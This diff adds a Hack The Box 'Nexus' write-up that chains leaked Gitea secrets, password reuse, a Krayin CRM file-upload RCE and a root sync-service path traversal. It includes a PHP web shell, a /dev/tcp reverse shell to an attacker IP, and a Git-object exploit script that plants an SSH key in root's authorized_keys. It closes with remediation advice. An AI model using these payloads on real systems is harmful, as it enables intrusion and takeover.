@@ -1,0 +1,520 @@
+export const frontmatter = {
+  title: "Hack The Box Nexus Machine Writeup",
+  slug: "hack-the-box-nexus-machine-writeup",
+  category: "HTB Machine",
+  description:
+    "Complete walkthrough of the Hack The Box Nexus machine, covering Gitea secret disclosure, Krayin CRM CVE-2026-36340 remote code execution, credential reuse for SSH access, and root privilege escalation via a vulnerable Gitea template synchronization service susceptible to Git path traversal.",
+  date: "2026-07-01",
+};
+
+export const metadata = {
+  title:
+    "Hack The Box Nexus Writeup | Krayin CRM RCE to Root via Gitea Template Sync Path Traversal | loxcalhost",
+  description:
+    "Step-by-step Hack The Box Nexus writeup demonstrating Gitea repository secret disclosure, exploitation of Krayin CRM CVE-2026-36340 for remote code execution, credential reuse to obtain SSH access, and root privilege escalation by abusing a vulnerable root-owned Gitea template synchronization service.",
+};
+
+# Introduction
+
+This write-up documents the compromise of the **Nexus** Linux host, beginning with external reconnaissance and ending with full root compromise. The attack leveraged exposed development resources, credential reuse, a vulnerable CRM application, and an insecure privileged automation service. Each stage demonstrates how individually low- to medium-severity issues can be chained together to achieve complete system compromise.
+
+## Overview
+
+The assessment began by enumerating the exposed web services hosted on `nexus.htb`, leading to the discovery of additional virtual hosts for Gitea and Krayin CRM. A publicly accessible Gitea repository exposed sensitive environment variables containing application credentials, which were successfully reused to authenticate to the CRM application.
+
+After obtaining authenticated access, a known file upload vulnerability in Krayin CRM (**CVE-2026-36340**) was exploited to achieve remote code execution and gain an initial foothold on the server. Further enumeration revealed database credentials stored in a local `.env` file, which were reused to obtain SSH access as the `jones` user.
+
+Privilege escalation was achieved by abusing a root-owned systemd timer responsible for synchronizing Gitea template repositories. The synchronization script failed to validate file paths extracted from Git tree objects, making it vulnerable to path traversal. By crafting malicious Git objects, arbitrary files could be written anywhere on the filesystem as `root`, ultimately allowing an SSH public key to be written to `/root/.ssh/authorized_keys` and resulting in full administrative access.
+
+## Attack Chain
+
+1. Enumerated exposed services and discovered the `git.nexus.htb` and `billing.nexus.htb` virtual hosts.
+2. Identified a publicly accessible Gitea repository containing leaked `.env` configuration files.
+3. Reconstructed sensitive database credentials from the repository's commit history.
+4. Performed password reuse attacks and authenticated to Krayin CRM as `j.matthew`.
+5. Exploited **CVE-2026-36340** to upload a PHP web shell and achieve remote code execution.
+6. Extracted local database credentials from the application's `.env` file.
+7. Reused the database password to obtain SSH access as the `jones` user.
+8. Discovered a root-owned systemd timer executing `template-sync.py`.
+9. Identified a path traversal vulnerability in the template synchronization process.
+10. Crafted malicious Git tree objects to overwrite `/root/.ssh/authorized_keys`.
+11. Logged in as `root` via SSH using the injected public key.
+
+## Setup
+
+First, download the VPN configuration file from the platform and establish a connection using OpenVPN:
+```
+sudo openvpn release_au-2.ovpn
+```
+
+To confirm that the target machine is reachable across the VPN, we can send a few ICMP echo requests:
+```
+$ ping -c 4 10.129.112.3
+
+PING 10.129.112.3 (10.129.112.3) 56(84) bytes of data.
+64 bytes from 10.129.112.3: icmp_seq=1 ttl=63 time=334 ms
+64 bytes from 10.129.112.3: icmp_seq=2 ttl=63 time=304 ms
+64 bytes from 10.129.112.3: icmp_seq=3 ttl=63 time=512 ms
+64 bytes from 10.129.112.3: icmp_seq=4 ttl=63 time=331 ms
+
+--- 10.129.112.3 ping statistics ---
+4 packets transmitted, 4 received, 0% packet loss, time 3000ms
+rtt min/avg/max/mdev = 303.804/370.104/511.707/82.598 ms
+```
+
+Navigating to the target IP address (`10.129.112.3`) in a web browser triggers an automatic redirect to `http://nexus.htb`. However, the connection fails, and the page does not load.
+
+> **Note:** Because `nexus.htb` is a private, unregistered domain, public DNS servers cannot resolve it. We must manually map the target IP to this hostname locally so our system knows where to route the request.
+
+We can resolve this by appending the IP and domain to our local `/etc/hosts` file:
+```
+echo '10.129.112.3    nexus.htb' | sudo tee -a /etc/hosts
+```
+
+Once this entry is added, refreshing the browser allows the domain to resolve properly, granting us access to the web application.
+
+## Enumeration
+
+We begin our enumeration with a port scan using Nmap to identify open ports and the services running on the target machine:
+```
+$ nmap -sV 10.129.112.3
+
+Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-27 15:31 IST
+Nmap scan report for nexus.htb (10.129.112.3)
+Host is up (0.32s latency).
+Not shown: 998 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    nginx 1.24.0 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 71.95 seconds
+```
+
+Based on the Nmap results, the target is running Ubuntu Linux and has two accessible ports:
+- **Port 22 (ssh):** SSH Server
+- **Port 80 (http):** HTTP Server
+
+Enumerate subdomains using gobuster:
+```
+$ gobuster vhost -u nexus.htb -w subdomains-top1million-5000.txt --append-domain`
+
+===============================================================
+Gobuster v3.8.2
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                       http://nexus.htb
+[+] Method:                    GET
+[+] Threads:                   10
+[+] Wordlist:                  subdomains-top1million-5000.txt
+[+] User Agent:                gobuster/3.8.2
+[+] Timeout:                   10s
+[+] Append Domain:             true
+[+] Exclude Hostname Length:   false
+===============================================================
+Starting gobuster in VHOST enumeration mode
+===============================================================
+git.nexus.htb Status: 200 [Size: 14472]
+billing.nexus.htb Status: 302 [Size: 390] [--> http://billing.nexus.htb/admin/login]
+Progress: 5000 / 5000 (100.00%)
+===============================================================
+Finished
+===============================================================
+```
+
+The output reveals two new subdomains: `git.nexus.htb` and `billing.nexus.htb`. Add both entries to the `/etc/hosts` file so they resolve correctly during further enumeration.
+
+On `nexus.htb`, the **Careers** section reveals the hiring manager's email address: `j.matthew@nexus.htb`.
+
+Visiting `billing.nexus.htb` reveals that it is powered by **Krayin CRM** and visiting `gitea.nexus.htb` reveals that it is running **Gitea v1.26.0**.
+
+Perform directory enumeration with Gobuster:
+```
+$ gobuster dir -u http://git.nexus.htb -w raft-medium-directories.txt
+
+===============================================================
+Gobuster v3.8.2
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://git.nexus.htb
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /home/vinod/Desktop/SecLists/Discovery/Web-Content/raft-medium-directories.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.8.2
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+admin                (Status: 200) [Size: 22801]
+Admin                (Status: 200) [Size: 22801]
+v2                   (Status: 401) [Size: 49]
+ADMIN                (Status: 200) [Size: 22801]
+issues               (Status: 303) [Size: 60] [--> /user/login?redirect_to=%2Fissues]
+explore              (Status: 303) [Size: 41] [--> /explore/repos]
+notifications        (Status: 303) [Size: 67] [--> /user/login?redirect_to=%2Fnotifications]
+milestones           (Status: 303) [Size: 64] [--> /user/login?redirect_to=%2Fmilestones]
+Progress: 29999 / 29999 (100.00%)
+===============================================================
+Finished
+===============================================================
+```
+
+The output reveals a directory named `admin`. Visiting `gitea.nexus.htb/admin` loads the profile for the `admin` user, which contains a single repository named `krayin-docker-setup`.
+
+Inspecting the repository reveals a sensitive `.env` file. Although the file has been modified across two commits, combining the contents from both commits allows us to reconstruct the complete configuration:
+```
+APP_URL=http://billing.nexus.htb
+DB_CONNECTION=mysql
+DB_HOST=krayin-mysql
+DB_PORT=3306
+DB_DATABASE=krayin
+DB_USERNAME=krayin
+DB_PASSWORD=N27xh!!2ucY04
+```
+
+## Foothold
+
+To test for password reuse, I tried the credentials `admin:N27xh!!2ucY04` and `j.matthew:N27xh!!2ucY04` on both `gitea.nexus.htb` and `billing.nexus.htb`.
+
+Fortunately, the credentials `j.matthew:N27xh!!2ucY04` were valid for **Krayin CRM**, granting access to the application.
+
+The application is running **Krayin CRM v2.2.0**, which is vulnerable to [**CVE-2026-36340**](https://nvd.nist.gov/vuln/detail/CVE-2026-36340). Although the advisory and the public proof-of-concept (PoC) list **v2.1.5** as the affected version, the vulnerability is still present in the current **v2.2.0** instance. A public PoC is available on GitHub [here](https://github.com/cybercrewinc/CVE-2026-36340).
+
+The vulnerability arises because an authenticated user can upload arbitrary PHP files through the email composition feature. Uploaded attachments are stored in a publicly accessible directory without proper file validation or execution restrictions. As a result, an attacker can upload a PHP web shell and execute arbitrary commands on the server, leading to remote code execution.
+
+Now, navigate to Mail --> Inbox --> Compose Mail and then enter dummy data for To, Subject and Body and for web shell save the following code:
+```
+<html>
+<body>
+<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
+<input type="TEXT" name="cmd" id="cmd" size="80">
+<input type="SUBMIT" value="Execute">
+</form>
+<pre>
+<?php
+    if(isset($_GET['cmd']))
+    {
+        system($_GET['cmd']);
+    }
+?>
+</pre>
+</body>
+<script>document.getElementById("cmd").focus();</script>
+</html>
+```
+
+Upload the PHP file as an email attachment and click **Send**. Once the email is sent, the web shell becomes accessible at `http://billing.nexus.htb/storage/emails/1/test.php?cmd=id`.
+
+To upgrade the web shell to a Netcat reverse shell, execute `bash -c '0<&158-;exec 158<>/dev/tcp/10.10.14.32/9001;sh <&158 >&158 2>&158'`. Before running the payload, start a Netcat listener on your attack machine using `nc -lvnp 9001`.
+
+To upgrade the basic shell to a fully interactive TTY, execute the following stabilization steps:
+```
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+CTRL+Z
+stty raw -echo; fg
+export TERM=xterm
+```
+
+## Lateral Movement
+
+At `/var/www/krayin`, the `.env` file contains the database credentials:
+```
+DB_CONNECTION=mysql
+DB_HOST=127.0.0.1
+DB_PORT=3306
+DB_DATABASE=krayin
+DB_USERNAME=krayin
+DB_PASSWORD=y27xb3ha!!74GbR
+```
+
+A password hash for the `james` user is present in the database, but it could not be cracked using `rockyou.txt` with Hashcat. Instead, I tested the database password for password reuse against the local system users, `jones` and `git`, via SSH. Fortunately, the credentials `jones:y27xb3ha!!74GbR` were valid, providing SSH access as the `jones` user.
+
+## Privilege Escalation
+
+Listing the active systemd timers reveals a timer named `gitea-template-sync.timer`:
+```
+jones@nexus:~$ systemctl list-timers --all
+
+Tue 2026-06-30 08:19:36 UTC      50s Tue 2026-06-30 08:18:36 UTC    9s ago gitea-template-sync.timer      gitea-template-sync.service      gitea-template-sync.s>
+```
+
+Check the timer's status:
+```
+jones@nexus:~$ systemctl status gitea-template-sync.timer
+
+_ gitea-template-sync.timer - Run Gitea template sync every minute
+     Loaded: loaded (/etc/systemd/system/gitea-template-sync.timer; enabled; preset: enabled)
+     Active: active (waiting) since Wed 2026-07-01 08:28:24 UTC; 1h 21min ago
+    Trigger: Wed 2026-07-01 09:50:39 UTC; 30s left
+   Triggers: _ gitea-template-sync.service
+```
+
+Then inspect the associated service:
+
+```
+jones@nexus:~$ systemctl status gitea-template-sync.service
+
+_ gitea-template-sync.service - Sync Gitea templates
+     Loaded: loaded (/etc/systemd/system/gitea-template-sync.service; static)
+     Active: inactive (dead) since Wed 2026-07-01 09:49:39 UTC; 56s ago
+TriggeredBy: _ gitea-template-sync.timer
+    Process: 2512 ExecStart=/usr/bin/python3 /etc/gitea/template-sync.py (code=exited, status=0/SUCCESS)
+   Main PID: 2512 (code=exited, status=0/SUCCESS)
+        CPU: 97ms
+```
+
+The service executes the Python script `/etc/gitea/template-sync.py` every minute.
+
+Inspecting the service definition shows that the script is executed as the `root` user:
+```
+jones@nexus:~$ systemctl cat gitea-template-sync.service
+
+# /etc/systemd/system/gitea-template-sync.service
+[Unit]
+Description=Sync Gitea templates
+After=network-online.target
+
+[Service]
+Type=oneshot
+User=root
+ExecStart=/usr/bin/python3 /etc/gitea/template-sync.py
+TimeoutStartSec=50s
+```
+
+Every user on the system has read access to `/etc/gitea/template-sync.py`, allowing us to inspect the script and understand what actions are performed each time the timer executes.
+
+View the contents of the script:
+```
+jones@nexus:~$ cat /etc/gitea/template-sync.py
+
+import os
+import sys
+import json
+import subprocess
+import time
+import urllib.request
+
+GITEA_URL = "http://localhost:3000"
+REPO_ROOT = "/var/lib/gitea/data/gitea-repositories"
+STAGING_DIR = "/home/git/template-staging"
+LOG_FILE = "/var/log/template-sync.log"
+
+def log(msg):
+    ts = time.strftime("%Y-%m-%d %H:%M:%S")
+    line = "[%s] %s" % (ts, msg)
+    print(line, flush=True)
+    try:
+        os.makedirs(os.path.dirname(LOG_FILE), exist_ok=True)
+        with open(LOG_FILE, 'a') as f:
+            f.write(line + '\n')
+    except:
+        pass
+
+def load_config():
+    config = {}
+    for path in ['/etc/gitea/template-sync.conf', '/opt/forge/app/.env']:
+        try:
+            with open(path) as f:
+                for line in f:
+                    line = line.strip()
+                    if line and not line.startswith('#') and '=' in line:
+                        k, v = line.split('=', 1)
+                        config[k.strip()] = v.strip()
+        except:
+            pass
+    return config
+
+def get_token():
+    cfg = load_config()
+    return cfg.get('GITEA_API_TOKEN')
+
+def get_template_repos(token):
+    url = "%s/api/v1/repos/search?limit=50" % GITEA_URL
+    req = urllib.request.Request(url, headers={
+        'Authorization': 'token %s' % token
+    })
+    try:
+        with urllib.request.urlopen(req) as resp:
+            data = json.loads(resp.read())
+            repos = data.get('data', data) if isinstance(data, dict) else data
+            return [r for r in repos if r.get('template', False)]
+    except Exception as e:
+        log("API error: %s" % e)
+        return []
+
+def sync_template(repo_info):
+    owner = repo_info['owner']['login']
+    name = repo_info['name'].lower()
+    bare_path = os.path.join(REPO_ROOT, owner, "%s.git" % name)
+    stage_path = os.path.join(STAGING_DIR, owner, name)
+
+    if not os.path.isdir(bare_path):
+        log("  repo not found: %s" % bare_path)
+        return
+
+    # Read tree entries from the bare repository
+    try:
+        GIT = ['git', '-c', 'safe.directory=*']
+        result = subprocess.run(
+            GIT + ['ls-tree', '-r', 'HEAD'],
+            cwd=bare_path,
+            capture_output=True, text=True, timeout=10
+        )
+        if result.returncode != 0:
+            log("  ls-tree failed: %s" % result.stderr.strip())
+            return
+    except Exception as e:
+        log("  ls-tree error: %s" % e)
+        return
+
+    entries = []
+    for line in result.stdout.strip().split('\n'):
+        if not line:
+            continue
+        parts = line.split('\t', 1)
+        if len(parts) != 2:
+            continue
+        meta, filepath = parts
+        mode, objtype, objhash = meta.split()
+        if objtype == 'blob':
+            entries.append((mode, objhash, filepath))
+
+    if not entries:
+        log("  no files in template")
+        return
+
+    # Extract files to staging directory
+    for mode, objhash, filepath in entries:
+        target = os.path.join(stage_path, filepath)
+        target_dir = os.path.dirname(target)
+
+        try:
+            os.makedirs(target_dir, exist_ok=True)
+            GIT = ['git', '-c', 'safe.directory=*']
+            cat_result = subprocess.run(
+                GIT + ['cat-file', 'blob', objhash],
+                cwd=bare_path,
+                capture_output=True, timeout=10
+            )
+            if cat_result.returncode != 0:
+                continue
+
+            with open(target, 'wb') as f:
+                f.write(cat_result.stdout)
+
+            if mode == '100755':
+                os.chmod(target, 0o755)
+            else:
+                os.chmod(target, 0o644)
+
+            log("  synced: %s" % filepath)
+        except Exception as e:
+            log("  error syncing %s: %s" % (filepath, e))
+
+def main():
+    log("Template sync starting")
+
+    token = get_token()
+    if not token:
+        log("No API token found")
+        sys.exit(1)
+
+    templates = get_template_repos(token)
+    log("Found %d template repo(s)" % len(templates))
+
+    for repo in templates:
+        name = repo['full_name']
+        log("Syncing template: %s" % name)
+        sync_template(repo)
+
+    log("Template sync complete")
+
+if __name__ == '__main__':
+    main()
+```
+
+Inspection of the `gitea-template-sync.py` script revealed that it is executed as `root` every minute by a systemd timer to synchronize files from Gitea template repositories into `/home/git/template-staging`. The script authenticates to the local Gitea instance using an API token, enumerates all files in each template repository with `git ls-tree -r HEAD`, retrieves their contents using `git cat-file`, and reconstructs the repository by writing each file to disk using `os.path.join(stage_path, filepath)`. Because the `filepath` value is taken directly from the Git tree without any sanitization or validation, the script is vulnerable to a path traversal attack. By manually crafting Git tree objects containing `..` directory entries, it is possible to escape the intended staging directory and write arbitrary files anywhere on the filesystem. Since the service runs with root privileges, this flaw can be exploited to overwrite sensitive files such as `/root/.ssh/authorized_keys`, ultimately allowing SSH access as the `root` user.
+
+First, create a new repository in Gitea and ensure the **"Mark repository as a template"** option is selected. Clone the repository locally:
+```
+git clone http://localhost:3000/jones/rce.git
+```
+
+Navigate into the cloned repository and create a blank `README.md` file:
+```
+touch README.md
+```
+
+Next, generate an SSH key pair that will later be written to the target system:
+```
+ssh-keygen -t ed25519 -f /tmp/.key -N ''
+```
+
+Finally, save the following Python script, which manually constructs raw Git objects containing path traversal (`..`) entries within Git tree objects. This bypasses the standard Git client's filename validation and prepares a malicious repository structure that will be processed by the vulnerable template synchronization service.
+```
+#!/usr/bin/env python3
+import hashlib,zlib,os,subprocess,sys,time
+
+def write_obj(data,t):
+    h=("%s %d"%(t,len(data))).encode()+b"\x00"
+    s=h+data
+    sha=hashlib.sha1(s).hexdigest()
+    d=os.path.join(".git","objects",sha[:2])
+    os.makedirs(d,exist_ok=True)
+    p=os.path.join(d,sha[2:])
+    if not os.path.exists(p):
+        open(p,"wb").write(zlib.compress(s))
+    return sha
+
+def entry(mode,name,sha):
+    return("%s %s"%(mode,name)).encode()+b"\x00"+bytes.fromhex(sha)
+
+if not os.path.isdir(".git"):
+    print("Run inside git repo");sys.exit(1)
+
+r=subprocess.run(["cat","/tmp/.k.pub"],capture_output=True,text=True)
+if r.returncode!=0:
+    print("ssh-keygen -t ed25519 -f /tmp/.k -N ''");sys.exit(1)
+key=r.stdout.strip()+"\n"
+
+blob=write_obj(key.encode(),"blob")
+readme=write_obj(b"# Template\n","blob")
+ssh_t=write_obj(entry("100644","authorized_keys",blob),"tree")
+cur=write_obj(entry("40000",".ssh",ssh_t),"tree")
+fir=write_obj(entry("40000","root",cur),"tree")
+for i in range(4):
+    fir=write_obj(entry("40000","..",fir),"tree")
+root=write_obj(entry("100644","README.md",readme)+entry("40000","..",fir),"tree")
+ts=int(time.time())
+c="tree %s\nauthor x <x@x> %d +0000\ncommitter x <x@x> %d +0000\n\ninit\n"%(root,ts,ts)
+sha=write_obj(c.encode(),"commit")
+os.makedirs(os.path.join(".git","refs","heads"),exist_ok=True)
+open(os.path.join(".git","refs","heads","main"),"w").write(sha+"\n")
+print("Done: "+sha)
+```
+
+After saving the script, execute it with Python from inside the cloned repository. Upon successful execution, the script creates the required Git objects and updates the local `main` branch to point to the crafted commit. Push the repository to Gitea:
+```
+git push -u origin main
+```
+
+Next, wait for approximately one minute for the `gitea-template-sync` systemd timer to execute. During the synchronization process, the vulnerable service reconstructs the repository using the malicious tree entries, allowing the path traversal payload to write the generated SSH public key to `/root/.ssh/authorized_keys`. Once the synchronization completes, authenticate as the `root` user using the corresponding private key:
+```
+ssh -i /tmp/.key root@nexus.htb
+```
+
+**Author's Note:** The final privilege escalation was learned from the official walkthrough after I got stuck during enumeration.
+
+## Remediation & Recommendations
+
+- Remove sensitive files such as `.env` files, API tokens, and credentials from source code repositories. If secrets are accidentally committed, rotate them immediately and rewrite the repository history where appropriate.
+- Enforce unique passwords for application accounts, database users, and operating system users to prevent credential reuse across services.
+- Upgrade Krayin CRM to a version that addresses **CVE-2026-36340**, or apply the vendor-provided security patch. Restrict uploaded file types and ensure uploaded content cannot be executed by the web server.
+- Store uploaded files outside the web root or configure the web server to prevent execution of user-uploaded content.
+- Apply the principle of least privilege by avoiding execution of scheduled tasks as `root` unless absolutely necessary.
+- Sanitize and validate all file paths before writing files to disk. Reject absolute paths and path traversal sequences such as `..`, and verify that the final resolved path remains within the intended destination directory.
+- Secure automation scripts by validating all input originating from repositories or other untrusted sources before processing.
+- Regularly audit privileged scheduled tasks and systemd services for insecure file operations and improper trust boundaries.
+- Continuously scan public and internal repositories for exposed secrets using automated secret-scanning tools.
